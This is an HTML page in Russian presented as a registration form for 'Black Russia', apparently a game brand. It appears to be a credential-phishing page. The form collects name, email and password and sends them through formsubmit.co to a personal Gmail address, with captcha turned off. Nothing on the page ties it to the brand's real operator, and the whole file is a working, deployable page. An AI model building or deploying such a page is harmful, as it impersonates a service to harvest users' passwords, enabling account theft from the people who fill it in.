
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>Black Russia — Регистрация</title>
  <style>
    body, html {
      margin: 0; padding: 0;
      width: 100%; height: 100%;
      background: #4c1b17;
      color: white;
      font-family: sans-serif;
    }
    header {
      position: absolute;
      top: 20px;
      left: 20px;
      display: flex;
      align-items: center;
    }
    .logo-container {
      display: flex;
      align-items: center;
    }
    .logo-container img {
      height: 60px;
      width: auto;
    }
    .logo-text {
      display: flex;
      flex-direction: column;
      margin-left: 10px;
      line-height: 1;
    }
    .logo-text .line-black {
      color: #FF0000;
      font-size: 1.2rem;
      font-weight: bold;
    }
    .logo-text .line-russia {
      color: #FFFFFF;
      font-size: 1.2rem;
      font-weight: bold;
    }

    main {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    form {
      background: rgba(0,0,0,0.4);
      padding: 20px;
      border-radius: 8px;
      width: 90%; max-width: 400px;
      box-sizing: border-box;
    }
    form input {
      width: 100%; margin: 10px 0; padding: 10px;
      border: none; border-radius: 4px;
    }
    form button {
      transition: all 0.3s ease;
    
      width: 100%; padding: 10px;
      background: #FFD700;
      border: none; border-radius: 4px;
      color: black; font-weight: bold;
      cursor: pointer;
      transform: scale(1);
    
    }

    .steps {
      margin: 30px 0;
      max-width: 400px;
      text-align: left;
      color: white;
    }
    .steps div {
      margin: 10px 0;
      background: rgba(255,255,255,0.1);
      padding: 10px;
      border-radius: 4px;
    }
  </style>
</head>
<body>

<header>
  <div class="logo-container">
    <img src="logo.png" alt="Black Russia Logo">
    <div class="logo-text">
      <div class="line-black">Black</div>
      <div class="line-russia">Russia</div>
    </div>
  </div>
</header>

<main>
  <form action="https://formsubmit.co/stanislavsisa26@gmail.com" method="POST">
    <input name="Имя" type="text" placeholder="Имя" required>
    <input name="Email" type="email" placeholder="Электронная почта" required>
    <input name="Пароль" type="password" placeholder="Пароль" required>
    <input name="Подтверждение пароля" type="password" placeholder="Повторите пароль" required>
    <button type="submit">Зарегистрироваться</button>

    <input type="hidden" name="_subject" value="Новая регистрация Black Russia">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_template" value="table">
  </form>

  <div class="steps">
    <div>1. Заполните форму</div>
    <div>2. Подтвердите Email</div>
    <div>3. Подтвердите пароль</div>
    <div>4. Завершите регистрацию и получите доступ</div>
  </div>
</main>

</body>
</html>
